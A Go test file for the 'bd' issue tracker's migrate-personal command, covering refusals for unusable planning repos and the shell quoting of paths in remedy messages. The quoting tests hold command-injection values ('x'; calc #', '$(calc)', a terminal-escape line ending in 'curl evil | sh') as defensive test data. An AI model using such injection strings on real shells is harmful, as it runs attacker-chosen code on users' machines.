		"`, then rerun, and run `bd repo add "+quoted+"` again if you want them hydrated); nothing was moved")
	requireStillInProject(t, beadsDir, "mps", personal.ID)

	if out, err := bdRunWithFlockRetry(t, bd, dir, "repo", "remove", planningDir); err != nil {
		t.Fatalf("bd repo remove: %v\n%s", err, out)
	}
	requireMigratePersonal(t, bd, dir)
	requireMovedToPlanning(t, beadsDir, "mps", planningDir, personal.ID, personalTitle)
	kept, err := openStore(t, filepath.Join(planningDir, ".beads"), migratePersonalPlanningDatabase).GetIssue(t.Context(), planningIssue.ID)
	if err != nil {
		t.Fatalf("planning repo's own issue %s gone after migrate-personal: %v", planningIssue.ID, err)
	}
	if kept.Title != planningTitle {
		t.Errorf("planning issue %s title = %q, want unchanged %q", planningIssue.ID, kept.Title, planningTitle)
	}
}

// TestEmbeddedMigratePersonal_abortLeavesLegacyPlanningConfig verifies that an
// aborted run does not rewrite a planning repo that still has a legacy
// config.json: the self-routing check runs before the prompt and must read the
// workspace without migrating its metadata.
func TestEmbeddedMigratePersonal_abortLeavesLegacyPlanningConfig(t *testing.T) {
	if os.Getenv("BEADS_TEST_EMBEDDED_DOLT") != "1" {
		t.Skip("set BEADS_TEST_EMBEDDED_DOLT=1 to run embedded dolt integration tests")
	}
	t.Parallel()

	bd := buildEmbeddedBD(t)
	dir, beadsDir, _ := bdInit(t, bd, "--prefix", "mpl")
	planningDir := t.TempDir()
	planningBeadsDir := filepath.Join(planningDir, ".beads")
	if err := os.MkdirAll(planningBeadsDir, 0o750); err != nil {
		t.Fatalf("create planning .beads: %v", err)
	}
	legacyPath := filepath.Join(planningBeadsDir, "config.json")
	legacy := []byte(`{"database":"beads.db"}`)
	if err := os.WriteFile(legacyPath, legacy, 0o600); err != nil {
		t.Fatalf("write legacy planning config.json: %v", err)
	}
	if out, err := bdRunWithFlockRetry(t, bd, dir, "config", "set", "routing.contributor", planningDir); err != nil {
		t.Fatalf("bd config set routing.contributor: %v\n%s", err, out)
	}
	personal := bdCreate(t, bd, dir, "Personal issue for a legacy planning repo")

	cmd := exec.Command(bd, "migrate-personal")
	cmd.Dir = dir
	cmd.Env = bdEnv(dir)
	cmd.Stdin = strings.NewReader("n\n")
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("bd migrate-personal (answer n) failed: %v\noutput:\n%s", err, out)
	}
	if !strings.Contains(string(out), "Aborted") {
		t.Errorf("bd migrate-personal (answer n) did not abort:\n%s", out)
	}

	got, err := os.ReadFile(legacyPath)
	if err != nil {
		t.Fatalf("legacy planning config.json gone after an aborted migrate-personal: %v", err)
	}
	if string(got) != string(legacy) {
		t.Errorf("legacy planning config.json = %s after an aborted migrate-personal, want unchanged %s", got, legacy)
	}
	if _, err := os.Stat(filepath.Join(planningBeadsDir, "metadata.json")); !os.IsNotExist(err) {
		t.Errorf("planning metadata.json written by an aborted migrate-personal: stat err = %v, want not exist", err)
	}
	requireStillInProject(t, beadsDir, "mpl", personal.ID)
}

// planningDirListing returns the names of every entry under beadsDir, relative
// to it, so a refused run can be checked for having written nothing there.
func planningDirListing(t *testing.T, beadsDir string) []string {
	t.Helper()
	var names []string
	err := filepath.WalkDir(beadsDir, func(path string, _ os.DirEntry, err error) error {
		if err != nil {
			return err
		}
		rel, err := filepath.Rel(beadsDir, path)
		if err != nil {
			return err
		}
		names = append(names, rel)
		return nil
	})
	if err != nil {
		t.Fatalf("list %s: %v", beadsDir, err)
	}
	return names
}

// requireInNoPlanningDatabase asserts that no database under beadsDir holds
// issueID. It reads each database through its own connection: openStore's
// embedded store cache is keyed on beadsDir alone, so a second openStore of a
// sibling database would hand back the first.
func requireInNoPlanningDatabase(t *testing.T, beadsDir, issueID string) {
	t.Helper()
	for _, database := range embeddeddolt.Databases(beadsDir) {
		db, cleanup, err := embeddeddolt.OpenSQL(t.Context(), filepath.Join(beadsDir, "embeddeddolt"), database, "main")
		if err != nil {
			t.Fatalf("OpenSQL %s: %v", database, err)
		}
		var count int
		err = db.QueryRowContext(t.Context(), "SELECT COUNT(*) FROM issues WHERE id = ?", issueID).Scan(&count)
		_ = cleanup()
		if err != nil {
			t.Fatalf("query issues in %s: %v", database, err)
		}
		if count != 0 {
			t.Errorf("planning database %q holds %s after a refused migrate-personal", database, issueID)
		}
	}
}

// migratePersonalStderr runs "bd migrate-personal --yes" in dir and returns its
// stderr alone and its exit code.
func migratePersonalStderr(t *testing.T, bd, dir string) (string, int) {
	t.Helper()
	cmd := exec.Command(bd, "migrate-personal", "--yes")
	cmd.Dir = dir
	cmd.Env = bdEnv(dir)
	var stderr strings.Builder
	cmd.Stderr = &stderr
	var exitErr *exec.ExitError
	if err := cmd.Run(); errors.As(err, &exitErr) {
		return stderr.String(), exitErr.ExitCode()
	} else if err != nil {
		t.Fatalf("run bd migrate-personal --yes: %v", err)
	}
	return stderr.String(), 0
}

// TestEmbeddedMigratePersonal_refusesUninitializablePlanningRepos verifies that
// a planning .beads migrate-personal must not open or initialize is refused
// before anything moves, and is left as it was. A redirect stub is refused
// with or without a metadata.json and database of its own: bd run in the
// planning repo follows the redirect, so it never reads the stub's database or
// one initialized there. The refusal points routing.contributor at the
// redirect target only when the stub names no database or the one the target
// names. A metadata-less SQLite-era repo that bd's own
// admission refuses is refused with that refusal's rendering (a fresh database
// beside it would hide its data and silence the refusal), and a metadata-less
// .beads holding several databases is refused because nothing records which
// one bd uses there.
func TestEmbeddedMigratePersonal_refusesUninitializablePlanningRepos(t *testing.T) {
	if os.Getenv("BEADS_TEST_EMBEDDED_DOLT") != "1" {
		t.Skip("set BEADS_TEST_EMBEDDED_DOLT=1 to run embedded dolt integration tests")
	}
	t.Parallel()

	bd := buildEmbeddedBD(t)
	// writeRedirect points planningBeadsDir at a separate initialized repo.
	writeRedirect := func(t *testing.T, planningBeadsDir string) {
		t.Helper()
		target := t.TempDir()
		initCmd := exec.Command(bd, "init", "--prefix", "pl", "--quiet")
		initCmd.Dir = target
		initCmd.Env = bdEnv(target)
		if out, err := initCmd.CombinedOutput(); err != nil {
			t.Fatalf("bd init redirect target: %v\n%s", err, out)
		}
		if err := os.WriteFile(filepath.Join(planningBeadsDir, "redirect"), []byte(filepath.Join(target, ".beads")+"\n"), 0o600); err != nil {
			t.Fatalf("write planning redirect: %v", err)
		}
	}
	// createDatabase creates an embedded database under planningBeadsDir,
	// with issue_prefix set to prefix when prefix is not empty.
	createDatabase := func(t *testing.T, planningBeadsDir, database, prefix string) {
		t.Helper()
		s, err := embeddeddolt.Open(t.Context(), planningBeadsDir, database, "main")
		if err != nil {
			t.Fatalf("create planning database %q: %v", database, err)
		}
		if prefix != "" {
			if err := s.SetConfig(t.Context(), "issue_prefix", prefix); err != nil {
				_ = s.Close()
				t.Fatalf("set issue_prefix in planning database %q: %v", database, err)
			}
		}
		if err := s.Close(); err != nil {
			t.Fatalf("close planning database %q: %v", database, err)
		}
	}
	// writeEmbeddedMetadata gives planningBeadsDir a metadata.json naming
	// the embedded database database.
	writeEmbeddedMetadata := func(t *testing.T, planningBeadsDir, database string) {
		t.Helper()
		cfg := configfile.DefaultConfig()
		cfg.Backend = configfile.BackendDolt
		cfg.DoltMode = configfile.DoltModeEmbedded
		cfg.DoltDatabase = database
		if err := cfg.Save(planningBeadsDir); err != nil {
			t.Fatalf("write planning metadata.json: %v", err)
		}
	}
	for _, tc := range []struct {
		name   string
		prefix string
		want   string
		// setup shapes planningBeadsDir, which exists and is empty.
		setup func(t *testing.T, planningBeadsDir string)
		// wantStderr, when set, is the refusal's whole stderr, which exits
		// wantCode, or 1 when wantCode is 0.
		wantStderr func(planningDir string) string
		wantCode   int
	}{
		{name: "redirect stub", prefix: "mps", want: "; set routing.contributor to that repository instead", setup: writeRedirect},
		{name: "redirect stub with metadata", prefix: "mpr", want: "; set routing.contributor to that repository instead", setup: func(t *testing.T, planningBeadsDir string) {
			// A working stub of its own: without the refusal the move would
			// land here and report success. It names the database the redirect
			// target names, so routing.contributor can select it.
			createDatabase(t, planningBeadsDir, "pl", "pl")
			writeEmbeddedMetadata(t, planningBeadsDir, "pl")
			writeRedirect(t, planningBeadsDir)
		}},
		{name: "redirect stub naming another database", prefix: "mpt", want: `where bd uses the database "rig" that the planning repo names; routing.contributor cannot select that database`, setup: func(t *testing.T, planningBeadsDir string) {
			// bd run in the planning repo uses rig on the redirect target;
			// routing.contributor pointed there would select the target's own
			// pl database instead.
			writeEmbeddedMetadata(t, planningBeadsDir, "rig")
			writeRedirect(t, planningBeadsDir)
		}},
		{name: "sqlite-era repo", prefix: "mpq", want: "historical SQLite workspace", setup: func(t *testing.T, planningBeadsDir string) {
			if err := os.WriteFile(filepath.Join(planningBeadsDir, "config.json"), []byte(`{"database":"beads.db"}`), 0o600); err != nil {
				t.Fatalf("write legacy planning config.json: %v", err)
			}
			db := append([]byte("SQLite format 3\x00"), make([]byte, 4080)...)
			if err := os.WriteFile(filepath.Join(planningBeadsDir, "beads.db"), db, 0o600); err != nil {
				t.Fatalf("write legacy planning beads.db: %v", err)
			}
		}, wantStderr: func(planningDir string) string {
			// bd's own admission refusal, naming the planning repo, with no
			// "failed to open" prefix and no usage dump.
			return "Error: planning repo " + planningDir + ": " + legacyUpgradeRefusal("historical SQLite workspace").Error() + "\n"
		}},
		{name: "several databases without metadata", prefix: "mpv", want: "holds several databases (beads, other)", setup: func(t *testing.T, planningBeadsDir string) {
			createDatabase(t, planningBeadsDir, "beads", "")
			createDatabase(t, planningBeadsDir, "other", "")
		}},
		// bd run in a planning repo whose own config.yaml selects server mode
		// opens its server database; an embedded metadata.json written there
		// would outrank that file and hide it, as would adopting a stale
		// embedded database beside it.
		{name: "server mode in its config.yaml", prefix: "mpj", want: "selects Dolt server mode", setup: writeServerModeWorkspace},
		{name: "server mode beside a stale embedded database", prefix: "mpz", want: "selects Dolt server mode", setup: func(t *testing.T, planningBeadsDir string) {
			writeServerModeWorkspace(t, planningBeadsDir)
			createDatabase(t, planningBeadsDir, "beads", "")
		}},
		// A planning repo in a format this build cannot open is refused as
		// that, exactly as bd's own admission refuses it, whatever mode its
		// config selects: the format fence runs before the config is read.
		{name: "graph format marker beside a server-mode config.yaml", prefix: "mpf", want: "graph-preview-format", setup: func(t *testing.T, planningBeadsDir string) {
			writeServerModeWorkspace(t, planningBeadsDir)
			if err := os.WriteFile(filepath.Join(planningBeadsDir, configfile.GraphFormatMarkerFile), nil, 0o600); err != nil {
				t.Fatalf("write planning graph format marker: %v", err)
			}
		}, wantStderr: func(planningDir string) string {
			formatErr := &configfile.UnsupportedWorkspaceFormatError{BeadsDir: filepath.Join(planningDir, ".beads"), FormatMarker: true}
			return "Error: " + formatErr.Error() + "\nHint: " + formatErr.Hint() + "\n"
		}, wantCode: ExitUnsupportedWorkspaceFormat},
	} {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			dir, beadsDir, _ := bdInit(t, bd, "--prefix", tc.prefix)
			planningDir := t.TempDir()
			planningBeadsDir := filepath.Join(planningDir, ".beads")
			if err := os.MkdirAll(planningBeadsDir, 0o750); err != nil {
				t.Fatalf("create planning .beads: %v", err)
			}
			tc.setup(t, planningBeadsDir)
			if out, err := bdRunWithFlockRetry(t, bd, dir, "config", "set", "routing.contributor", planningDir); err != nil {
				t.Fatalf("bd config set routing.contributor: %v\n%s", err, out)
			}
			personal := bdCreate(t, bd, dir, "Personal issue for an uninitializable planning repo")
			before := planningDirListing(t, planningBeadsDir)

			out := requireMigratePersonalRefused(t, bd, dir, tc.want)
			if tc.wantCode != ExitUnsupportedWorkspaceFormat {
				// The format refusal names the planning repo's .beads, as bd's
				// own admission does there; its wantStderr pins it whole.
				requireCleanPlanningRefusal(t, out, planningDir)
			}
			requireStillInProject(t, beadsDir, tc.prefix, personal.ID)
			if after := planningDirListing(t, planningBeadsDir); !slices.Equal(after, before) {
				t.Errorf("planning .beads after a refused migrate-personal = %v, want unchanged %v", after, before)
			}
			requireInNoPlanningDatabase(t, planningBeadsDir, personal.ID)
			if tc.wantStderr != nil {
				wantCode := tc.wantCode
				if wantCode == 0 {
					wantCode = 1
				}
				stderr, code := migratePersonalStderr(t, bd, dir)
				if want := tc.wantStderr(planningDir); stderr != want || code != wantCode {
					t.Errorf("bd migrate-personal --yes exit %d, stderr:\n%s\nwant exit %d, stderr exactly:\n%s", code, stderr, wantCode, want)
				}
			}
		})
	}
}

// TestEmbeddedMigratePersonal_unsupportedPlanningFormatExit16 verifies that a
// planning repo in a format this build cannot open is refused the way bd's own
// admission refuses it: exit ExitUnsupportedWorkspaceFormat, with only the
// Error and Hint lines on stderr.
func TestEmbeddedMigratePersonal_unsupportedPlanningFormatExit16(t *testing.T) {
	if os.Getenv("BEADS_TEST_EMBEDDED_DOLT") != "1" {
		t.Skip("set BEADS_TEST_EMBEDDED_DOLT=1 to run embedded dolt integration tests")
	}
	t.Parallel()

	bd := buildEmbeddedBD(t)
	dir, beadsDir, _ := bdInit(t, bd, "--prefix", "mpg")
	planningDir := setupContributorRouting(t, bd, dir)
	metadataPath := filepath.Join(planningDir, ".beads", "metadata.json")
	raw, err := os.ReadFile(metadataPath)
	if err != nil {
		t.Fatalf("read planning metadata.json: %v", err)
	}
	var doc map[string]any
	if err := json.Unmarshal(raw, &doc); err != nil {
		t.Fatalf("parse planning metadata.json: %v", err)
	}
	doc["graph_mode"] = "graph"
	raw, err = json.Marshal(doc)
	if err != nil {
		t.Fatalf("encode planning metadata.json: %v", err)
	}
	if err := os.WriteFile(metadataPath, raw, 0o600); err != nil {
		t.Fatalf("write planning metadata.json: %v", err)
	}
	personal := bdCreate(t, bd, dir, "Personal issue for a graph-format planning repo")

	out := requireMigratePersonalRefused(t, bd, dir, "use a bd build that supports graph_mode")
	if strings.Contains(out, "initialize planning repo") {
		t.Errorf("format refusal carries the initialize prefix:\n%s", out)
	}
	cmd := exec.Command(bd, "migrate-personal", "--yes")
	cmd.Dir = dir
	cmd.Env = bdEnv(dir)
	var stderr strings.Builder
	cmd.Stderr = &stderr
	err = cmd.Run()
	var exitErr *exec.ExitError
	if !errors.As(err, &exitErr) || exitErr.ExitCode() != ExitUnsupportedWorkspaceFormat {
		t.Errorf("bd migrate-personal --yes err = %v, want exit %d", err, ExitUnsupportedWorkspaceFormat)
	}
	// stderr is exactly bd's own admission refusal: the Error and Hint lines,
	// with no "Error: exit code 16" placeholder from cobra and no usage dump.
	formatErr := &configfile.UnsupportedWorkspaceFormatError{
		BeadsDir:  filepath.Join(planningDir, ".beads"),
		GraphMode: "graph",
	}
	wantStderr := "Error: " + formatErr.Error() + "\nHint: " + formatErr.Hint() + "\n"
	if got := stderr.String(); got != wantStderr {
		t.Errorf("bd migrate-personal --yes stderr:\n%s\nwant exactly:\n%s", got, wantStderr)
	}
	requireStillInProject(t, beadsDir, "mpg", personal.ID)
}

// TestIsPlanningRepoMirror pins which project copies the phase-0 refusal
// treats as bd repo sync mirrors of the planning repo, the only ones it points
// at bd repo remove: a source_repo naming the planning repo, however it is
// spelled. Any other source_repo gets the plain refusal, since bd repo remove
// deletes every issue that carries it.
func TestIsPlanningRepoMirror(t *testing.T) {
	t.Parallel()
	type mirrorCase struct {
		name       string
		sourceRepo string
		want       bool
	}
	planning := t.TempDir()
	cases := []mirrorCase{
		{"no source repo", "", false},
		{"this workspace", ".", false},
		{"the planning repo", planning, true},
		{"the planning repo with a trailing slash", planning + string(filepath.Separator), true},
		{"another repository", t.TempDir(), false},
	}
	// Symlinks need privileges on some Windows hosts; the case is skipped there.
	link := filepath.Join(t.TempDir(), "planning-link")
	if err := os.Symlink(planning, link); err == nil {
		cases = append(cases, mirrorCase{"the planning repo through a symlink", link, true})
	}
	for _, tc := range cases {
		if got := isPlanningRepoMirror(&types.Issue{SourceRepo: tc.sourceRepo}, planning); got != tc.want {
			t.Errorf("%s: isPlanningRepoMirror(source_repo %q) = %v, want %v", tc.name, tc.sourceRepo, got, tc.want)
		}
	}
}

// TestShellQuotedFor pins how a remedy quotes a value (a source_repo, a
// dolt.host) for the shell its command is pasted into, and which values it
// refuses to print in a command at all (shellQuotedFor). On POSIX a value goes
// in single quotes unless it holds a backslash, which fish reads as an escape
// there, or a single quote: PowerShell ends them at a ' even as
// doltutil.ShellQuote escapes it, and at ‘ ’ ‚ ‛. On Windows a value goes in
// plain double quotes, which keep its backslashes as they are (Go's %q
// doubled them, and bd repo remove then found no such repository), unless a
// Windows shell would not pass it on unchanged: a " ends cmd.exe's quotes, so
// the rest of a crafted host runs as a command; PowerShell expands $( ) and
// $name, unescapes a backtick and ends the quotes at a curly quote; cmd.exe
// expands %name% and !name! and ends the command at a line break, and acts on
// & | < > ^ in an argument PowerShell hands a .cmd shim unquoted, and reads
// ; , = there as separating a batch file's arguments, so a shim that reads
// them one by one would hand bd init db.example.com;--recreate-missing as two;
// bash collapses \\ to one; and Go reads a trailing backslash as escaping the
// closing quote. Each POSIX and Windows character is refused by a row of its
// own. On both, a value that does not print as itself is refused: a control
// character ends the command, or redraws the printed one in the terminal so a
// different command is copied, U+202E reverses the text after it, U+2028
// splits the line, and a stray byte that is not UTF-8 can start a control
// sequence. A space such as U+00A0, U+202F or the U+3000 a Japanese IME types
// prints as itself, and is quoted like any other character. On a POSIX host
// each printed form is also run through a shell, which must pass the value on
// unchanged: sh for the POSIX forms, and bash, as Git Bash on Windows runs
// them, for the Windows forms.
func TestShellQuotedFor(t *testing.T) {
	t.Parallel()
	for _, tc := range []struct {
		goos, value, want string // want "" = refused
	}{
		{"linux", "/home/me/.beads-planning", `'/home/me/.beads-planning'`},
		{"darwin", "/tmp/$HOME/`id`", "'/tmp/$HOME/`id`'"},
		{"linux", "/home/zoë/計画 (2)", "'/home/zoë/計画 (2)'"},
		{"linux", "/home/太郎/プロジェクト\u3000計画", "'/home/太郎/プロジェクト\u3000計画'"},
		{"linux", "/home/me/my\u00a0planning", "'/home/me/my\u00a0planning'"},
		{"darwin", "/Users/me/Planning 9.41\u202fAM", "'/Users/me/Planning 9.41\u202fAM'"},
		{"linux", "db.example.com;--recreate-missing", "'db.example.com;--recreate-missing'"},
		{"linux", `x" & calc & "$(calc)`, `'x" & calc & "$(calc)'`},
		{"linux", "db\ncalc", ""},
		{"linux", "\x1b[2K\rbd init --server-host db; curl evil | sh #", ""},
		{"darwin", "db\u009bx", ""},
		{"linux", "db\x9b2Jx", ""},
		{"linux", "db\u202ex", ""},
		{"linux", "db\u2028x", ""},
		{"linux", `x\'; calc #`, ""},
		{"linux", `x\`, ""},
		{"linux", "x'; calc #", ""},
		{"darwin", "x\u2018; calc #", ""},
		{"darwin", "x\u2019; calc #", ""},
		{"darwin", "x\u201a; calc #", ""},
		{"darwin", "x\u201b; calc #", ""},
		{"windows", `C:\Users\me\.beads-planning`, `"C:\Users\me\.beads-planning"`},
		{"windows", `C:\Users\Jane Doe\Proj (x86) it's #1 @home ~a +b [e] {f}`, `"C:\Users\Jane Doe\Proj (x86) it's #1 @home ~a +b [e] {f}"`},
		{"windows", `C:\Users\太郎\プロジェクト` + "\u3000" + `計画`, `"C:\Users\太郎\プロジェクト` + "\u3000" + `計画"`},
		{"windows", `C:\Users\me\my` + "\u00a0" + `planning`, `"C:\Users\me\my` + "\u00a0" + `planning"`},
		{"windows", "db.example.com; calc", ""},
		{"windows", "db.example.com;--recreate-missing", ""},
		{"windows", "db.example.com,--recreate-missing", ""},
		{"windows", "db.example.com=--recreate-missing", ""},
		{"windows", `x" & calc & "`, ""},
		{"windows", `x";calc;#`, ""},
		{"windows", "db\u201ex", ""},
		{"windows", "db\u201cx", ""},
		{"windows", "db\u201dx", ""},
		{"windows", "db|calc", ""},
		{"windows", "db<x", ""},
		{"windows", "db>x", ""},
		{"windows", "db^x", ""},
		{"windows", "\x1b[2K\rbd init", ""},
		{"windows", "db\u202ex", ""},
		{"windows", "db\u2028x", ""},
		{"windows", "$(calc)", ""},
		{"windows", `C:\Users\me\$work\planning`, ""},
		{"windows", "C:\\Users\\me\\`tplanning", ""},
		{"windows", "db\u201d; calc; \u201c", ""},
		{"windows", `C:\100%PATH%\planning`, ""},
		{"windows", `C:\Hello!\planning`, ""},
		{"windows", "db&calc", ""},
		{"windows", `C:\Users\Jane Doe\R&D planning`, ""},
		{"windows", "db\r\ncalc", ""},
		{"windows", `\\server\share\planning`, ""},
		{"windows", `C:\planning\`, ""},
	} {
		got, ok := shellQuotedFor(tc.goos, tc.value)
		if got != tc.want || ok != (tc.want != "") {
			t.Errorf("shellQuotedFor(%q, %q) = %s, %v, want %s, %v", tc.goos, tc.value, got, ok, tc.want, tc.want != "")
		}
		if !ok || runtime.GOOS == "windows" {
			continue
		}
		shell := "sh"
		if tc.goos == "windows" {
			shell = "bash"
		}
		out, err := exec.Command(shell, "-c", "printf '%s' "+got).Output()
		if err != nil {
			t.Fatalf("%s -c \"printf '%%s' %s\": %v", shell, got, err)
		}
		if string(out) != tc.value {
			t.Errorf("%s passed %s on as %q, want %q", shell, got, out, tc.value)
		}
	}
}

// TestEscapedValue pins how a refusal names a value its remedy leaves as a
// placeholder (escapedValue): Go-quoted, so strconv.Unquote reads the name back
// as the value, with every quote and every $ ` % ! & | < > ^ ; , = escaped too,
// so no shell expands what is between its double quotes, ends them early or
// splits the argument there, and a user who pastes the name as printed runs
// nothing. strconv.Quote alone left x" & calc & "$(calc) as
// "x\" & calc & \"$(calc)", which bash runs $(calc) in, and PowerShell, which
// takes \ literally, ends at the second " and runs calc. On a POSIX host each
// name is also run through sh, which must print what is between its quotes,
// reading only each \\ there as one backslash.
func TestEscapedValue(t *testing.T) {
	t.Parallel()
	for _, tc := range []struct{ value, want string }{
		{"db.example.com", `"db.example.com"`},
		{`x" & calc & "$(calc)`, `"x\x22 \x26 calc \x26 \x22\x24(calc)"`},
		{"x'; calc #", `"x\x27\x3b calc #"`},
		{`C:\Users\me\$work\planning\`, `"C:\\Users\\me\\\x24work\\planning\\"`},
		{"db.example.com;--recreate-missing,=", `"db.example.com\x3b--recreate-missing\x2c\x3d"`},
		{"`calc` %PATH% !x! a|b<c>d^e", `"\x60calc\x60 \x25PATH\x25 \x21x\x21 a\x7cb\x3cc\x3ed\x5ee"`},
		{"\u201ccalc\u201d \u201e \u2018x\u2019 \u201a \u201b", `"\u201ccalc\u201d \u201e \u2018x\u2019 \u201a \u201b"`},
		{"\x1b[2K\rbd\u202e\u3000計画\xff", `"\x1b[2K\rbd\u202e\u3000計画\xff"`},
	} {
		got := escapedValue(tc.value)
		if got != tc.want {
			t.Errorf("escapedValue(%q) = %s, want %s", tc.value, got, tc.want)
		}
		if unquoted, err := strconv.Unquote(got); err != nil || unquoted != tc.value {
			t.Errorf("strconv.Unquote(%s) = %q, %v, want %q", got, unquoted, err, tc.value)
		}
		inner := strings.TrimSuffix(strings.TrimPrefix(got, `"`), `"`)
		if strings.ContainsAny(inner, "\"“”„'‘’‚‛$`%!&|<>^;,=") {
			t.Errorf("escapedValue(%q) = %s holds a character a shell acts on between its quotes", tc.value, got)
		}
		if runtime.GOOS == "windows" {
			continue
		}
		out, err := exec.Command("sh", "-c", "printf '%s' "+got).Output()
		if err != nil {
			t.Fatalf("sh -c \"printf '%%s' %s\": %v", got, err)
		}
		if want := strings.ReplaceAll(inner, `\\`, `\`); string(out) != want {
			t.Errorf("sh printed %s as %q, want %q", got, out, want)
		}
	}
}

// TestRepoSyncMirrorRefusal pins the phase-0 refusal's bd repo remove and bd
// repo add commands on both platforms: the source_repo quoted for the shell
// (TestShellQuotedFor), or, when no quoting passes it on unchanged there, a
// <path> placeholder for the path the refusal names escaped (TestEscapedValue),
// so pasting that name in its place runs nothing either. A value it names that
// does not print as itself, such as one holding a carriage return, a terminal
// escape or U+202E, is named escaped (printedValue), so none of those reaches
// the line the commands are printed on.
func TestRepoSyncMirrorRefusal(t *testing.T) {
	t.Parallel()
	const prefix = "issue mps-1 already exists in the planning repo P; the project copy was imported from "
	const placeholders = "`bd repo sync` (remove those copies with `bd repo remove <path>`, then rerun, and run `bd repo add <path>` again if you want them hydrated, with that path for <path>); nothing was moved"
	for _, tc := range []struct {
		goos, sourceRepo, want string
	}{
		{"linux", "/home/me/planning", prefix + "/home/me/planning by `bd repo sync` (remove those copies with `bd repo remove '/home/me/planning'`, then rerun, and run `bd repo add '/home/me/planning'` again if you want them hydrated); nothing was moved"},
		{"windows", `C:\planning`, prefix + `C:\planning by ` + "`bd repo sync` (remove those copies with `bd repo remove \"C:\\planning\"`, then rerun, and run `bd repo add \"C:\\planning\"` again if you want them hydrated); nothing was moved"},
		{"windows", `C:\planning\`, prefix + `"C:\\planning\\" by ` + placeholders},
		{"windows", `C:\Users\me\$work\planning`, prefix + `"C:\\Users\\me\\\x24work\\planning" by ` + placeholders},
		{"windows", `C:\x" & calc & "$(calc)`, prefix + `"C:\\x\x22 \x26 calc \x26 \x22\x24(calc)" by ` + placeholders},
		{"linux", "/home/me/x'; calc #", prefix + `"/home/me/x\x27\x3b calc #" by ` + placeholders},
		{"linux", "/home/me/planning/\x1b[2K\r/..", prefix + `"/home/me/planning/\x1b[2K\r/.." by ` + placeholders},
		{"windows", "C:\\planning\u202e\\..", prefix + `"C:\\planning\u202e\\.." by ` + placeholders},
	} {
		err := repoSyncMirrorRefusal(&types.Issue{ID: "mps-1", SourceRepo: tc.sourceRepo}, "P", tc.goos)
		if err == nil || err.Error() != tc.want || strings.ContainsAny(err.Error(), "\x1b\r\u202e") {
			t.Errorf("repoSyncMirrorRefusal(source_repo %q, %q) = %q\nwant %q", tc.sourceRepo, tc.goos, err, tc.want)
		}
	}
	// The issue ID and planning repo it names beside the commands are spelled
	// the same way.
	id, planningPath := "mps-1\x1b[2K", "/home/me/planning\r"
	err := repoSyncMirrorRefusal(&types.Issue{ID: id, SourceRepo: planningPath}, planningPath, "linux")
	want := `issue "mps-1\x1b[2K" already exists in the planning repo "/home/me/planning\r"; the project copy was imported from "/home/me/planning\r" by ` + placeholders
	if err == nil || err.Error() != want || strings.ContainsAny(err.Error(), "\x1b\r") {
		t.Errorf("repoSyncMirrorRefusal(ID %q, planning repo %q) = %q\nwant %q", id, planningPath, err, want)
	}
}
